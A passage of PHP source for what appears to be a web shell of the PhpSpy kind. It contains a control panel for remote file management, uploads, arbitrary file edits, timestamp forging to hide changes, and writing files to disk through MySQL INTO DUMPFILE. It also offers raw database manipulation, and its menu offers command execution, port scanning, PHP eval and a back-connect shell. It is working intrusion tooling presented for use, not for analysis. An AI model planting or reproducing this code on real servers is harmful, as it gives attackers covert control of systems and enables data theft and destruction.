        return;
    }
    $('filelist').doing.value=doing;
    if (thefile){
        $('filelist').thefile.value=thefile;
    }
    $('filelist').submit();
}
function createfile(nowpath){
    var filename;
    filename = prompt('Please input the file name:', '');
    if (!filename) return;
    opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
    $('fileopform').action.value=action;
    $('fileopform').opfile.value=opfile;
    $('fileopform').dir.value=dir;
    $('fileopform').submit();
}
function godir(dir,view_writable){
    if (view_writable) {
        $('godir').view_writable.value=view_writable;
    }
    $('godir').dir.value=dir;
    $('godir').submit();
}
function getsize(getdir,dir){
    $('getsize').getdir.value=getdir;
    $('getsize').dir.value=dir;
    $('getsize').submit();
}
function editrecord(action, base64, tablename){
    if (action == 'del') {      
        if (!confirm('Is or isn\'t deletion record?')) return;
    }
    $('recordlist').doing.value=action;
    $('recordlist').base64.value=base64;
    $('recordlist').tablename.value=tablename;
    $('recordlist').submit();
}
function moddbname(dbname) {
    if(!dbname) return;
    $('setdbname').dbname.value=dbname;
    $('setdbname').submit();
}
function settable(tablename,doing,page) {
    if(!tablename) return;
    if (doing) {
        $('settable').doing.value=doing;
    }
    if (page) {
        $('settable').page.value=page;
    }
    $('settable').tablename.value=tablename;
    $('settable').submit();
}
function s(action,nowpath,p1,p2,p3,p4,p5) {
    if(action) $('opform').action.value=action;
    if(nowpath) $('opform').nowpath.value=nowpath;
    if(p1) $('opform').p1.value=p1;
    if(p2) $('opform').p2.value=p2;
    if(p3) $('opform').p3.value=p3;
    if(p4) $('opform').p4.value=p4;
    if(p5) $('opform').p4.value=p5;
}
function g(action,nowpath,p1,p2,p3,p4,p5) {
    if(!action) return;
    s(action,nowpath,p1,p2,p3,p4,p5);
    $('opform').submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body style="margin:0;table-layout:fixed; word-break:break-all"&gt;
&lt;?php
formhead(array('name'=&gt;'opform'));
makehide('action', $action);
makehide('nowpath', $nowpath);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('p5', $p5);
formfoot();

if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(@posix_geteuid());
    $gid = @posix_getgrgid(@posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}

?&gt;
&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
    &lt;tr class="head"&gt;
        &lt;td&gt;&lt;span style="float:right;"&gt;&lt;?php echo @php_uname();?&gt; / User:&lt;?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?&gt;&lt;/span&gt;&lt;?php echo $_SERVER['HTTP_HOST'];?&gt; (&lt;?php echo gethostbyname($_SERVER['SERVER_NAME']);?&gt;)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr class="alt1"&gt;
        &lt;td&gt;
            &lt;span style="float:right;"&gt;PHP &lt;?php echo PHP_VERSION;?&gt; / Safe Mode:&lt;?php echo getcfg('safe_mode');?&gt;&lt;/span&gt;
            &lt;a href="javascript:g('logout');"&gt;Logout&lt;/a&gt; | 
            &lt;a href="javascript:g('file');"&gt;File Manager&lt;/a&gt; | 
            &lt;a href="javascript:g('mysqladmin');"&gt;MYSQL Manager&lt;/a&gt; | 
            &lt;a href="javascript:g('sqlfile');"&gt;MySQL Upload &amp;amp; Download&lt;/a&gt; | 
            &lt;a href="javascript:g('shell');"&gt;Execute Command&lt;/a&gt; | 
            &lt;a href="javascript:g('phpenv');"&gt;PHP Variable&lt;/a&gt; | 
            &lt;a href="javascript:g('portscan');"&gt;Port Scan&lt;/a&gt; | 
            &lt;a href="javascript:g('secinfo');"&gt;Security information&lt;/a&gt; | 
            &lt;a href="javascript:g('eval');"&gt;Eval PHP Code&lt;/a&gt;
            &lt;?php if (!IS_WIN) {?&gt; | &lt;a href="javascript:g('backconnect');"&gt;Back Connect&lt;/a&gt;&lt;?php }?&gt;
        &lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;
&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
&lt;?php
$errmsg &amp;&amp; m($errmsg);

// 获取当前路径
if (!$dir) {
    $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
    $dir = $dir.'/';
}

if ($action == 'file') {

    // 判断读写情况
    $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

    // 创建目录
    if ($newdirname) {
        $mkdirs = $nowpath.$newdirname;
        if (file_exists($mkdirs)) {
            m('Directory has already existed');
        } else {
            m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
            @chmod($mkdirs,0777);
        }
    }

    // 上传文件
    elseif ($doupfile) {
        m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
    }

    // 编辑文件
    elseif ($editfilename &amp;&amp; $filecontent) {
        $fp = @fopen($editfilename,'w');
        m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
        @fclose($fp);
    }

    // 编辑文件属性
    elseif ($pfile &amp;&amp; $newperm) {
        if (!file_exists($pfile)) {
            m('The original file does not exist');
        } else {
            $newperm = base_convert($newperm,8,10);
            m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
        }
    }

    // 改名
    elseif ($oldname &amp;&amp; $newfilename) {
        $nname = $nowpath.$newfilename;
        if (file_exists($nname) || !file_exists($oldname)) {
            m($nname.' has already existed or original file does not exist');
        } else {
            m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
        }
    }

    // 复制文件
    elseif ($sname &amp;&amp; $tofile) {
        if (file_exists($tofile) || !file_exists($sname)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
        }
    }

    // 克隆时间
    elseif ($curfile &amp;&amp; $tarfile) {
        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            $time = @filemtime($tarfile);
            m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
        }
    }

    // 自定义时间
    elseif ($curfile &amp;&amp; $year &amp;&amp; $month &amp;&amp; $day &amp;&amp; $hour &amp;&amp; $minute &amp;&amp; $second) {
        if (!@file_exists($curfile)) {
            m(basename($curfile).' does not exist');
        } else {
            $time = strtotime("$year-$month-$day $hour:$minute:$second");
            m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
        }
    }

    // 批量删除文件
    elseif($doing == 'delfiles') {
        if ($dl) {
            $dfiles='';
            $succ = $fail = 0;
            foreach ($dl as $filepath) {
                if (is_dir($filepath)) {
                    if (@deltree($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                } else {
                    if (@unlink($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                }
            }
            m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
        } else {
            m('Please select folder/file(s)');
        }
    }

    //操作完毕
    formhead(array('name'=&gt;'createdir'));
    makehide('newdirname');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=&gt;'fileperm'));
    makehide('newperm');
    makehide('pfile');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=&gt;'copyfile'));
    makehide('sname');
    makehide('tofile');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=&gt;'rename'));
    makehide('oldname');
    makehide('newfilename');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=&gt;'fileopform', 'target'=&gt;'_blank'));
    makehide('action');
    makehide('opfile');
    makehide('dir');
    formfoot();
    formhead(array('name'=&gt;'getsize'));
    makehide('getdir');
    makehide('dir');
    formfoot();

    $free = @disk_free_space($nowpath);
    !$free &amp;&amp; $free = 0;
    $all = @disk_total_space($nowpath);
    !$all &amp;&amp; $all = 0;
    $used = $all-$free;
    p('&lt;h2&gt;File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)&lt;/h2&gt;');

    $cwd_links = '';
    $path = explode('/', $nowpath);
    $n=count($path);
    for($i=0;$i&lt;$n-1;$i++) {
        $cwd_links .= '&lt;a href="javascript:godir(\'';
        for($j=0;$j&lt;=$i;$j++) {
            $cwd_links .= $path[$j].'/';
        }
        $cwd_links .= '\');"&gt;'.$path[$i].'/&lt;/a&gt;';
    }

?&gt;
&lt;script type="text/javascript"&gt;
document.onclick = shownav;
function shownav(e){
    var src = e?e.target:event.srcElement;
    do{
        if(src.id =="jumpto") {
            $('inputnav').style.display = "";
            $('pathnav').style.display = "none";
            //hidenav();
            return;
        }
        if(src.id =="inputnav") {
            return;
        }
        src = src.parentNode;
    }while(src.parentNode)

    $('inputnav').style.display = "none";
    $('pathnav').style.display = "";
}
&lt;/script&gt;
&lt;div style="background:#eee;margin-bottom:10px;"&gt;
    &lt;table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0"&gt;
        &lt;tr&gt;
            &lt;td width="100%"&gt;&lt;?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?&gt; (&lt;?php echo $dir_writeable;?&gt;)&lt;/td&gt;
            &lt;td nowrap&gt;&lt;input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"&gt;&lt;/td&gt;
        &lt;/tr&gt;
    &lt;/table&gt;
    &lt;table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;"&gt;
    &lt;form action="" method="post" id="godir" name="godir"&gt;
        &lt;tr&gt;
            &lt;td nowrap&gt;Current Directory (&lt;?php echo $dir_writeable;?&gt;, &lt;?php echo getChmod($nowpath);?&gt;)&lt;/td&gt;
            &lt;td width="100%"&gt;&lt;input name="view_writable" value="0" type="hidden" /&gt;&lt;input class="input" name="dir" value="&lt;?php echo $nowpath;?&gt;" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;
            &lt;td nowrap&gt;&lt;input class="bt" value="GO" type="submit"&gt;&lt;/td&gt;
        &lt;/tr&gt;
    &lt;/form&gt;
    &lt;/table&gt;
&lt;?php
    if (IS_WIN &amp;&amp; IS_COM) {
        $obj = new COM('scripting.filesystemobject');
        if ($obj &amp;&amp; is_object($obj) &amp;&amp; $obj-&gt;Drives) {
            echo '&lt;div class="drives"&gt;';
            $DriveTypeDB = array(0 =&gt; 'Unknow',1 =&gt; 'Removable',2 =&gt; 'Fixed',3 =&gt; 'Network',4 =&gt; 'CDRom',5 =&gt; 'RAM Disk');
            $comma = '';
            foreach($obj-&gt;Drives as $drive) {
                if ($drive-&gt;Path) {
                    p($comma.'&lt;a href="javascript:godir(\''.$drive-&gt;Path.'/\');"&gt;'.$DriveTypeDB[$drive-&gt;DriveType].'('.$drive-&gt;Path.')&lt;/a&gt;');
                    $comma = '&lt;span&gt;|&lt;/span&gt;';
                }
            }
            echo '&lt;/div&gt;';
        }
    }
?&gt;
&lt;/div&gt;
&lt;?php
    $findstr = $_POST['findstr'];
    $re = $_POST['re'];
    tbhead();
    p('&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;');
    p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data"&gt;&lt;div style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'.$nowpath.'" type="hidden" /&gt;&lt;input name="dir" value="'.$nowpath.'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;');
    p('&lt;a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');"&gt;WebRoot&lt;/a&gt;');
    p(' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;');
    p(' | &lt;a href="javascript:godir(\''.$nowpath.'\');"&gt;View All&lt;/a&gt;');
    p(' | View Writable ( &lt;a href="javascript:godir(\''.$nowpath.'\',\'dir\');"&gt;Directory&lt;/a&gt;');
    p(' | &lt;a href="javascript:godir(\''.$nowpath.'\',\'file\');"&gt;File&lt;/a&gt; )');
    p(' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="javascript:createfile(\''.$nowpath.'\');"&gt;Create File&lt;/a&gt;');

    p('&lt;div style="padding:5px 0;"&gt;&lt;form action="'.$self.'" method="POST"&gt;Find string in files(current folder): &lt;input class="input" name="findstr" value="'.$findstr.'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'.$writabledb.'" type="text" /&gt;&lt;input name="dir" value="'.$dir.'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;');

    p('&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');

    //查看所有可写文件和目录
    $dirdata=array();
    $filedata=array();

    if ($view_writable == 'dir') {
        $dirdata = GetWDirList($nowpath);
        $filedata = array();
    } elseif ($view_writable == 'file') {
        $dirdata = array();
        $filedata = GetWFileList($nowpath);
    } elseif ($findstr) {
        $dirdata = array();
        $filedata = GetSFileList($nowpath, $findstr, $re);
    } else {
        // 目录列表
        //scandir()效率更高
        $dirs=@opendir($dir);
        while ($file=@readdir($dirs)) {
            $filepath=$nowpath.$file;
            if(@is_dir($filepath)){
                $dirdb['filename']=$file;
                $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                $dirdb['dirchmod']=getChmod($filepath);
                $dirdb['dirperm']=getPerms($filepath);
                $dirdb['fileowner']=getUser($filepath);
                $dirdb['dirlink']=$nowpath;
                $dirdb['server_link']=$filepath;
                $dirdata[]=$dirdb;
            } else {        
                $filedb['filename']=$file;
                $filedb['size']=sizecount(@filesize($filepath));
                $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                $filedb['filechmod']=getChmod($filepath);
                $filedb['fileperm']=getPerms($filepath);
                $filedb['fileowner']=getUser($filepath);
                $filedb['dirlink']=$nowpath;
                $filedb['server_link']=$filepath;
                $filedata[]=$filedb;
            }
        }// while
        unset($dirdb);
        unset($filedb);
        @closedir($dirs);
    }
    @sort($dirdata);
    @sort($filedata);
    $dir_i = '0';

    p('&lt;form id="filelist" name="filelist" action="'.$self.'" method="post"&gt;');
    makehide('action','file');
    makehide('thefile');
    makehide('doing');
    makehide('dir',$nowpath);

    foreach($dirdata as $key =&gt; $dirdb){
        if($dirdb['filename']!='..' &amp;&amp; $dirdb['filename']!='.') {
            if($getdir &amp;&amp; $getdir == $dirdb['server_link']) {
                $attachsize = dirsize($dirdb['server_link']);
                $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
            } else {
                $attachsize = '&lt;a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');"&gt;Stat&lt;/a&gt;';
            }
            $thisbg = bg();
            p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
            p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"&gt;&lt;/td&gt;');
            p('&lt;td&gt;&lt;a href="javascript:godir(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['filename'].'&lt;/a&gt;&lt;/td&gt;');
            p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');"&gt;'.$dirdb['mtime'].'&lt;/a&gt;&lt;/td&gt;');
            p('&lt;td nowrap&gt;'.$attachsize.'&lt;/td&gt;');
            p('&lt;td nowrap&gt;');
            p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['dirchmod'].'&lt;/a&gt; / ');
            p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['dirperm'].'&lt;/a&gt;'.$dirdb['fileowner'].'&lt;/td&gt;');
            p('&lt;td nowrap&gt;&lt;a href="javascript:rename(\''.$dirdb['server_link'].'\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;');
            p('&lt;/tr&gt;');
            $dir_i++;
        } else {
            if($dirdb['filename']=='..') {
                p('&lt;tr class='.bg().'&gt;');
                p('&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="javascript:godir(\''.getUpPath($nowpath).'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;');
                p('&lt;/tr&gt;');
            }
        }
    }

    p('&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;');
    $file_i = '0';

    foreach($filedata as $key =&gt; $filedb){
        if($filedb['filename']!='..' &amp;&amp; $filedb['filename']!='.') {
            $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
            $thisbg = bg();
            p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
            p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"&gt;&lt;/td&gt;');
            p('&lt;td&gt;'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '&lt;a href="'.$fileurl.'" target="_blank"&gt;'.$filedb['filename'].'&lt;/a&gt;' : $filedb['filename']).'&lt;/td&gt;');
            p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');"&gt;'.$filedb['mtime'].'&lt;/a&gt;&lt;/td&gt;');
            p('&lt;td nowrap&gt;'.$filedb['size'].'&lt;/td&gt;');
            p('&lt;td nowrap&gt;');
            p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.$filedb['filechmod'].'&lt;/a&gt; / ');
            p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.$filedb['fileperm'].'&lt;/a&gt;'.$filedb['fileowner'].'&lt;/td&gt;');
            p('&lt;td nowrap&gt;');
            p('&lt;a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');"&gt;Down&lt;/a&gt; | ');
            p('&lt;a href="javascript:copyfile(\''.$filedb['server_link'].'\');"&gt;Copy&lt;/a&gt; | ');
            p('&lt;a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');"&gt;Edit&lt;/a&gt; | ');
            p('&lt;a href="javascript:rename(\''.$filedb['server_link'].'\');"&gt;Rename&lt;/a&gt;');
            p('&lt;/td&gt;&lt;/tr&gt;');
            $file_i++;
        }
    }
    p('&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');
    p('&lt;tr class="'.bg().'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'.$dir_i.' directories / '.$file_i.' files&lt;/td&gt;&lt;/tr&gt;');
    p('&lt;/form&gt;&lt;/table&gt;');
}// end dir

elseif ($action == 'sqlfile') {
    if($doing=="mysqlupload"){
        $file = $_FILES['uploadfile'];
        $filename = $file['tmp_name'];
        if (file_exists($savepath)) {
            m('The goal file has already existed');
        } else {
            if(!$filename) {
                m('Please choose a file');
            } else {
                $fp=@fopen($filename,'r');
                $contents=@fread($fp, filesize($filename));
                @fclose($fp);
                $contents = bin2hex($contents);
                if(!$upname) $upname = $file['name'];
                $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
                m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
            }
        }
    }
?&gt;
&lt;script type="text/javascript"&gt;
function mysqlfile(doing){
    if(!doing) return;
    $('doing').value=doing;
    $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
    $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
    $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
    $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
    $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
    $('mysqlfile').charset.value=$('dbinfo').charset.value;
    $('mysqlfile').submit();
}
&lt;/script&gt;
&lt;?php
    !$dbhost &amp;&amp; $dbhost = 'localhost';
    !$dbuser &amp;&amp; $dbuser = 'root';
    !$dbport &amp;&amp; $dbport = '3306';
    formhead(array('title'=&gt;'MYSQL Information','name'=&gt;'dbinfo'));
    makehide('action','sqlfile');
    p('&lt;p&gt;');
    p('DBHost:');
    makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
    p(':');
    makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
    p('DBUser:');
    makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
    p('DBPass:');
    makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
    p('DBName:');
    makeinput(array('name'=&gt;'dbname','size'=&gt;15,'value'=&gt;$dbname));
    p('DBCharset:');
    makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'nokey'=&gt;1));
    p('&lt;/p&gt;');
    formfoot();
    p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile"&gt;');
    p('&lt;h2&gt;Upload file&lt;/h2&gt;');
    p('&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;');
    p('&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" type="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;');
    p('&lt;h2&gt;Download file&lt;/h2&gt;');
    p('&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;');
    makehide('dbhost');
    makehide('dbport');
    makehide('dbuser');
    makehide('dbpass');
    makehide('dbname');
    makehide('charset');
    makehide('doing');
    makehide('action','sqlfile');
    p('&lt;/form&gt;');
}

elseif ($action == 'mysqladmin') {
    !$dbhost &amp;&amp; $dbhost = 'localhost';
    !$dbuser &amp;&amp; $dbuser = 'root';
    !$dbport &amp;&amp; $dbport = '3306';
    $dbform = '&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;';
    if(isset($dbhost)){
        $dbform .= "&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" /&gt;\n";
    }
    if(isset($dbuser)) {
        $dbform .= "&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" /&gt;\n";
    }
    if(isset($dbpass)) {
        $dbform .= "&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" /&gt;\n";
    }
    if(isset($dbport)) {
        $dbform .= "&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" /&gt;\n";
    }
    if(isset($dbname)) {
        $dbform .= "&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" /&gt;\n";
    }
    if(isset($charset)) {
        $dbform .= "&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" /&gt;\n";
    }

    if ($doing == 'backupmysql' &amp;&amp; $saveasfile) {
        if (!$table) {
            m('Please choose the table');
        } else {
            $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
            $fp = @fopen($path,'w');
            if ($fp) {
                foreach($table as $k =&gt; $v) {
                    if ($v) {
                        sqldumptable($v, $fp);
                    }
                }
                fclose($fp);                
                $fileurl = str_replace(SA_ROOT,'',$path);
                m('Database has success backup to &lt;a href="'.$fileurl.'" target="_blank"&gt;'.$path.'&lt;/a&gt;');
                mysql_close();
            } else {
                m('Backup failed');
            }
        }
    }
    if ($insert &amp;&amp; $insertsql) {
        $keystr = $valstr = $tmp = '';
        foreach($insertsql as $key =&gt; $val) {
            if ($val) {
                $keystr .= $tmp.$key;
                $valstr .= $tmp."'".addslashes($val)."'";
                $tmp = ',';
            }
        }
        if ($keystr &amp;&amp; $valstr) {
            $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
            m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
        }
    }
    if ($update &amp;&amp; $insertsql &amp;&amp; $base64) {
        $valstr = $tmp = '';
        foreach($insertsql as $key =&gt; $val) {
            $valstr .= $tmp.$key."='".addslashes($val)."'";
            $tmp = ',';
        }
        if ($valstr) {
            $where = base64_decode($base64);
            $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
            m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
        }
    }
    if ($doing == 'del' &amp;&amp; $base64) {
        $where = base64_decode($base64);
        $delete_sql = "DELETE FROM $tablename WHERE $where";
        $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
        m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
    }

    if ($tablename &amp;&amp; $doing == 'drop') {
        $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
        if (q("DROP TABLE $tablename")) {
            m('Drop table of success');
            $tablename = '';
        } else {
            m(mysql_error());
        }
    }

    formhead(array('title'=&gt;'MYSQL Manager'));
    makehide('action','mysqladmin');
    p('&lt;p&gt;');
    p('DBHost:');
    makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
    p(':');
    makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
    p('DBUser:');
    makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
    p('DBPass:');
    makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
    p('DBCharset:');
    makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'nokey'=&gt;1));
    makeinput(array('name'=&gt;'connect','value'=&gt;'Connect','type'=&gt;'submit','class'=&gt;'bt'));
    p('&lt;/p&gt;');
    formfoot();

    //操作记录
    formhead(array('name'=&gt;'recordlist'));
    makehide('doing');
    makehide('action','mysqladmin');
    makehide('base64');
    makehide('tablename');
    p($dbform);
    formfoot();

    //选定数据库
    formhead(array('name'=&gt;'setdbname'));
    makehide('action','mysqladmin');
    p($dbform);
    if (!$dbname) {
        makehide('dbname');
    }
    formfoot();

    //选定表
    formhead(array('name'=&gt;'settable'));
    makehide('action','mysqladmin');
    p($dbform);
    makehide('tablename');
    makehide('page',$page);
    makehide('doing');
    formfoot();

    $cachetables = array();     
    $pagenum = 30;
    $page = intval($page);
    if($page) {
        $start_limit = ($page - 1) * $pagenum;
    } else {
        $start_limit = 0;
        $page = 1;
    }
    if (isset($dbhost) &amp;&amp; isset($dbuser) &amp;&amp; isset($dbpass) &amp;&amp; isset($connect)) {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        //获取数据库信息
        $mysqlver = mysql_get_server_info();
        p('&lt;p&gt;MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'&lt;/p&gt;');
        $highver = $mysqlver &gt; '4.1' ? 1 : 0;

        //获取数据库
        $query = q("SHOW DATABASES");
        $dbs = array();
        $dbs[] = '-- Select a database --';
        while($db = mysql_fetch_array($query)) {
            $dbs[$db['Database']] = $db['Database'];
        }
        makeselect(array('title'=&gt;'Please select a database:','name'=&gt;'db[]','option'=&gt;$dbs,'selected'=&gt;$dbname,'onchange'=&gt;'moddbname(this.options[this.selectedIndex].value)','newline'=&gt;1));
        $tabledb = array();
        if ($dbname) {
            p('&lt;p&gt;');
            p('Current dababase: &lt;a href="javascript:moddbname(\''.$dbname.'\');"&gt;'.$dbname.'&lt;/a&gt;');
            if ($tablename) {
